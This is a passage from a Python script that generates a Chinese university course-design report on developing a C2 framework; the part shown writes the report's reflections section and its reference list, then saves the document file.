    doc.add_heading("7.4 心得体会", level=2)
    add_body(doc,
        "通过本次课程设计，我对网络安全攻防技术有了更深入的理解。"
        "C2 框架的开发过程涉及加密通信、系统编程、网络编程、安全对抗等多个技术领域，"
        "是一个综合性很强的项目。在开发过程中，我深刻体会到攻防对抗的本质是信息不对称的博弈"
        "——攻击者需要尽可能隐藏自己，而防御者需要尽可能发现异常。"
        "这种对抗思维对今后的安全研究和工作具有重要的指导意义。")

    # ═══════════════════════════════════════════════════════════════════════
    # 参考文献（小4号黑体，居中，字间空一汉字格）
    # ═══════════════════════════════════════════════════════════════════════
    add_centered_heading(doc, "参 考 文 献", size=SZ_REF_HD, char_spacing=200)

    for ref in [
        "Rivest R L, Shamir A, Adleman L. A method for obtaining digital signatures and public-key cryptosystems[J]. Communications of the ACM, 1978, 21(2): 120-126.",
        "National Institute of Standards and Technology. Advanced Encryption Standard (AES): FIPS 197[S]. Washington: NIST, 2001.",
        "McGrew D, Viega J. The Galois/Counter Mode of Operation (GCM): NIST SP 800-38D[S]. Gaithersburg: NIST, 2007.",
        "Microsoft Corporation. Windows API Index[EB/OL]. https://learn.microsoft.com/en-us/windows/win32/apiindex/, 2024.",
        "The PyCA Contributors. Cryptography: Python Cryptographic Authority[EB/OL]. https://cryptography.io/en/latest/, 2024.",
    ]:
        add_paragraph(doc, ref, font_size=SZ_BODY, first_indent=Cm(-0.74),
                      line_spacing=SP_BODY, space_after=Pt(4))
        # 悬挂缩进：left_indent 需要在 paragraph 上设置
        doc.paragraphs[-1].paragraph_format.left_indent = Cm(0.74)

    # ═══════════════════════════════════════════════════════════════════════
    # 保存（先保存到系统临时目录 ASCII 路径，再复制到中文目标路径）
    # ═══════════════════════════════════════════════════════════════════════
    import tempfile, shutil
    tmp_dir = tempfile.gettempdir()
    tmp_path = os.path.join(tmp_dir, "course_report_tmp.docx")
    doc.save(tmp_path)
    shutil.copy2(tmp_path, OUTPUT)
    os.remove(tmp_path)
    print(f"文档已生成: {OUTPUT}")
    print(f"文件大小: {os.path.getsize(OUTPUT) / 1024:.1f} KB")


if __name__ == "__main__":
    generate()
